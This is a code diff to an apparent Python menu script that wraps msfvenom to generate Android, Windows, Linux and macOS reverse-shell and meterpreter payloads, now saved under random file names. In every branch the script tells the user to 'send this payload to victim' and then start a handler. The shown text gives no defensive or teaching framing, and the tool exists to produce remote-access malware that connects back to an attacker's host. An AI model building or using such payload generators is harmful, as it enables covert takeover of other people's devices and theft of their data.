@@ -1,4 +1,5 @@
 import os
+import random
 try:
     # Color code
     R='\033[91m'
@@ -90,40 +91,48 @@ Select option to create handler\n"""+CY+"""
                 if ch==1:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerating payload..........\n")
-                    st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.apk"
+                    print(B+"\nGenerating payload..........\n")
+                    a=random.randint(1,99)
+                    st1="payload_"+str(a)+".apk"
+                    st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                     print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==2:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerating payload..........\n")
-                    st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.exe"
+                    print(B+"\nGenerating payload..........\n")
+                    a=random.randint(1,99)
+                    st1="payload_"+str(a)+".exe"
+                    st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                     print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==3:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerating payload..........\n")
-                    st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.elf"
+                    print(B+"\nGenerating payload..........\n")
+                    a=random.randint(1,99)
+                    st1="payload_"+str(a)+".elf"
+                    st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                     print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==4:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerating payload..........\n")
-                    st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.macho"
+                    print(B+"\nGenerating payload..........\n")
+                    a=random.randint(1,99)
+                    st1="payload_"+str(a)+".macho"
+                    st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                     print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
